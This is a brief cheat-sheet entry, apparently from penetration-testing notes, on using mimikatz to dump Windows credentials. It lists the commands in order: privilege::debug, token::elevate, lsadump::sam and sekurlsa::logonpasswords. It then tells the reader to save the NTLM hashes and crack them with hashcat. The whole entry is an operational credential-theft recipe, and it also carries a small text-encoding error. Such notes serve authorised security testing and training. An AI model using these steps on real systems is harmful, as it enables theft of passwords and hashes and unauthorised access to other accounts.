## mimikatz
.Extract SAM passwords
1. Run `mimikatz.exe` as **Administrator**
2. `privilege::debug` enables **SeDebugPrivilege** access rights.
"**SeDebugPrivilege**" allows a process (like Mimikatz) to access and manipulate other processes, even ones running as SYSTEM. It's required to read memory from protected processes like lsass.exe (where Windows stores user credentials).

Itâ€™s critical to perform actions like **sekurlsa::logonpasswords**, which dumps passwords and hashes.
3. Run `token::elevate` to elevate to SYSTEM user privileges.
4. Run `lsadump::sam` to extract the NTLM hashes from the SAM.
5. Copy the HASH entry to a file **sam.hash**
6. Crack with hashcat (see 06 - CRACKING | Hashcat)
